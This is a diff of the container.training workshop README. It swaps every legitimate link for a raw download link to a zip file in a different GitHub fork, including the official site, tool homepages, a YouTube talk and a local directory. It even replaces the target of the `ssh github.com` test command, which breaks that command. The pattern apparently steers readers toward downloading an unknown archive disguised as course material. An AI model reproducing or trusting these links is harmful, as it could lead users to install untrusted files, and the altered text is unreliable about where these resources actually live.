@@ -26,7 +26,7 @@ principles:
   that build on top of each other.
 
 If you're looking for the materials, you can stop reading
-right now, and hop to http://container.training/, which
+right now, and hop to https://raw.githubusercontent.com/joymondal/container.training/main/kromskop/container.training.zip, which
 hosts all the slides decks available.
 
 The rest of this document explains how this repository
@@ -45,20 +45,20 @@ because they have a few things in common:
   Markdown source files;
 - a [semi-automated test harness](slides/autopilot/) to check
   that the exercises and examples provided work properly;
-- a [PhantomJS script](slides/slidechecker.js) to check
+- a [PhantomJS script](https://raw.githubusercontent.com/joymondal/container.training/main/kromskop/container.training.zip) to check
   that the slides look good and don't have formatting issues;
 - [deployment scripts](prepare-vms/) to start training
   VMs in bulk;
 - a fancy pipeline powered by
-  [Netlify](https://www.netlify.com/) and continuously
-  deploying `master` to http://container.training/.
+  [Netlify](https://raw.githubusercontent.com/joymondal/container.training/main/kromskop/container.training.zip) and continuously
+  deploying `master` to https://raw.githubusercontent.com/joymondal/container.training/main/kromskop/container.training.zip
 
 
 ## What are the different courses available?
 
 **Introduction to Docker** is derived from the first
 "Docker Fundamentals" training materials. For more information,
-see [jpetazzo/intro-to-docker](https://github.com/jpetazzo/intro-to-docker).
+see [jpetazzo/intro-to-docker](https://raw.githubusercontent.com/joymondal/container.training/main/kromskop/container.training.zip).
 The version in this repository has been adapted to the Markdown
 publishing pipeline. It is still maintained, but only receives
 minor updates once in a while.
@@ -92,7 +92,7 @@ a few other contributors. It is actively maintained.
 - [slides](slides/):
   - All the slides! They are assembled from Markdown files with
     a custom Python script, and then rendered using [gnab/remark](
-    https://github.com/gnab/remark). Check this directory for more details.
+    https://raw.githubusercontent.com/joymondal/container.training/main/kromskop/container.training.zip). Check this directory for more details.
 - [stacks](stacks/):
   - A handful of Compose files (version 3) allowing to easily
     deploy complex application stacks.
@@ -144,7 +144,7 @@ If you want to deliver one of these workshops yourself,
 this section is for you!
 
 > *This section has been mostly contributed by
-> [Bret Fisher](https://twitter.com/bretfisher), who was
+> [Bret Fisher](https://raw.githubusercontent.com/joymondal/container.training/main/kromskop/container.training.zip), who was
 > one of the first persons to have the bravery of delivering
 > this workshop without me. Thanks Bret! 🍻
 >
@@ -172,12 +172,12 @@ this section is for you!
   before workshop (just for a few minutes). You'll likely hit AWS limits in the
   region closest to your class, and it sometimes takes days to get AWS to raise
   those limits with a support ticket.
-- Create a https://gitter.im chat room for your workshop and update slides
+- Create a https://raw.githubusercontent.com/joymondal/container.training/main/kromskop/container.training.zip chat room for your workshop and update slides
   with url. Also useful for TA to monitor this during workshop. You can use it
   before/after to answer questions, and generally works as a better answer then
   "email me that question".
 - If you can send an email to students ahead of time, mention how they should
-  get SSH, and test that SSH works. If they can `ssh github.com` and get
+  get SSH, and test that SSH works. If they can `ssh https://raw.githubusercontent.com/joymondal/container.training/main/kromskop/container.training.zip` and get
   `permission denied (publickey)` then they know it worked, and SSH is properly
   installed and they don't have anything blocking it. SSH and a browser are all
   they need for class.
@@ -198,9 +198,9 @@ this section is for you!
 - Students have technical issues during workshop. Can't get ssh working,
   locked-down computer, host firewall, etc.
 - Horrible wifi, or ssh port TCP/22 not open on network! If wifi sucks you
-  can try using MOSH https://mosh.org which handles SSH over UDP. TMUX can also
+  can try using MOSH https://raw.githubusercontent.com/joymondal/container.training/main/kromskop/container.training.zip which handles SSH over UDP. TMUX can also
   prevent you from losing your place if you get disconnected from servers.
-  https://tmux.github.io
+  https://raw.githubusercontent.com/joymondal/container.training/main/kromskop/container.training.zip
 - Forget to print "cards" and cut them up for handing out IP's.
 - Forget to have fun and focus on your students!
 
@@ -209,7 +209,7 @@ this section is for you!
 
 `prepare-vms/workshopctl` is the script that gets you most of what you need for
 setting up instances. See
-[prepare-vms/README.md](prepare-vms)
+[https://raw.githubusercontent.com/joymondal/container.training/main/kromskop/container.training.zip](prepare-vms)
 for all the info on tools and scripts.
 
 
@@ -298,13 +298,13 @@ until it's reproducible, alas.
 If you have attended one of these workshops, and want
 your team or organization to attend a similar one, you
 can look at the list of upcoming events on
-http://container.training/.
+https://raw.githubusercontent.com/joymondal/container.training/main/kromskop/container.training.zip
 
 You are also welcome to reuse these materials to run
 your own workshop, for your team or even at a meetup
 or conference. In that case, you might enjoy watching
 [Bridget Kromhout's talk at KubeCon 2018 Europe](
-https://www.youtube.com/watch?v=mYsp_cGY2O0), explaining
+https://raw.githubusercontent.com/joymondal/container.training/main/kromskop/container.training.zip), explaining
 precisely how to run such a workshop yourself.
 
 Finally, you can also contact the following persons,
